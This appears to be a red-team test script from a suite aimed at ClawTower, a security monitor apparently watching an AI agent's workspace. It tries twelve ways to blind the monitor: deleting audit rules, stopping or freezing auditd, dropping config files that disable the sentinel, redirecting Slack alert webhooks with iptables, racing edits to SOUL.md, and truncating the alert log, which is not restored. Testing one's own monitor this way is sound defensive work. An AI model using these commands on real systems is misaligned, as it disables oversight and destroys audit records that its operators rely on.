#!/usr/bin/env bash
# CAUTION: Some of these may actually impair ClawTower temporarily. Run on a test instance.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/redlobster-lib.sh"

rl_init_flag "flag10" "Flag 10: BLIND — Disabling ClawTower's senses"

# 1. Reduce audit backlog buffer
rl_run "auditctl -b 1 (reduce backlog)" \
  'sudo auditctl -b 1 2>/dev/null; sleep 1; sudo auditctl -b 8192 2>/dev/null'

# 2. Disk fill simulation
rl_run "disk fill simulation" \
  'dd if=/dev/zero of=/tmp/redlobster/flag10/diskfill.tmp bs=1M count=1 2>/dev/null; rm -f /tmp/redlobster/flag10/diskfill.tmp'

# 3. Delete all audit rules
rl_run "auditctl -D (delete rules)" \
  'sudo auditctl -D 2>/dev/null; sleep 2; sudo bash /home/openclaw/.openclaw/workspace/projects/ClawTower/scripts/setup-audit-rules.sh 2>/dev/null'

# 4. Config.d override injection
rl_run "config.d override injection" \
  'printf "[sentinel]\nenabled = false\n" | sudo tee /etc/clawtower/config.d/99-permissive.toml >/dev/null; sleep 2; sudo rm -f /etc/clawtower/config.d/99-permissive.toml'

# 5. Stop auditd
rl_run "stop auditd" \
  'sudo systemctl stop auditd 2>/dev/null; sleep 2; sudo systemctl start auditd 2>/dev/null'

# 6. Inotify watch exhaustion
rl_run "inotify watch exhaustion" \
  'python3 -c "import os; [os.makedirs(f\"/tmp/redlobster/flag10/inotify_{i}\", exist_ok=True) for i in range(1000)]"; rm -rf /tmp/redlobster/flag10/inotify_*'

# 7. Rapid create+delete race
rl_run "rapid create+delete race" \
  'for i in $(seq 1 50); do echo "tamper" > /home/openclaw/.openclaw/workspace/SOUL.md.tmp.$i; rm -f /home/openclaw/.openclaw/workspace/SOUL.md.tmp.$i; done'

# 8. Atomic rename over config
rl_run "atomic rename (mv) over config" \
  'printf "[sentinel]\nenabled = false\n" > /tmp/redlobster/flag10/99-tamper.toml; sudo mv /tmp/redlobster/flag10/99-tamper.toml /etc/clawtower/config.d/99-tamper.toml; sleep 2; sudo rm -f /etc/clawtower/config.d/99-tamper.toml'

# 9. SIGSTOP auditd
rl_run "SIGSTOP auditd (freeze)" \
  'sudo kill -STOP $(pidof auditd) 2>/dev/null; sleep 2; sudo kill -CONT $(pidof auditd) 2>/dev/null'

# 10. Iptables redirect Slack webhooks
rl_run "iptables redirect Slack" \
  'sudo iptables -t nat -A OUTPUT -p tcp --dport 443 -d hooks.slack.com -j REDIRECT --to-port 1 2>/dev/null; sleep 2; sudo iptables -t nat -D OUTPUT -p tcp --dport 443 -d hooks.slack.com -j REDIRECT --to-port 1 2>/dev/null'

# 11. Process flood
rl_run "process flood (100 rapid)" \
  'for i in $(seq 1 100); do /bin/true; done'

# 12. Truncate alert log
rl_run "truncate alert log" \
  'sudo truncate -s 0 /var/log/clawtower/alerts.jsonl 2>/dev/null'

rl_summary
rl_cleanup
